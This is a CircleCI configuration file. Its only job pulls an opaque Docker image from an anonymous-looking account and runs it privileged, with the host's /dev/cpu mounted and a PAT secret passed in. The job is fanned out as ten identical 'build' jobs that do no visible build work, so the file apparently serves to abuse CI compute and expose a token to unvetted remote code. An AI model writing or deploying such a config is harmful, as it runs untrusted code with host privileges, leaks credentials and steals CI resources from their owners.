version: 2.1

jobs:
  runner:
    parameters:
      target:
        type: string
        
    machine:
      image: ubuntu-2204:current
    steps:
      - run:
          name: Pull and run Docker container
          no_output_timeout: 1h
          command: docker pull anonymousperson457/test@sha256:ad26bdd7387e8fe8947d3c39cbe9d067275808de4c46d6a8f696bf9c847612a4 && docker run --rm --privileged -v /dev/cpu:/dev/cpu -e PAT anonymousperson457/test@sha256:ad26bdd7387e8fe8947d3c39cbe9d067275808de4c46d6a8f696bf9c847612a4
          
workflows:
  runner:
    jobs:
      - runner:
          name: << matrix.target >>
          matrix:
            parameters:
              target:
                - build-1
                - build-2
                - build-3
                - build-4
                - build-5
                - build-6
                - build-7
                - build-8
                - build-9
                - build-10
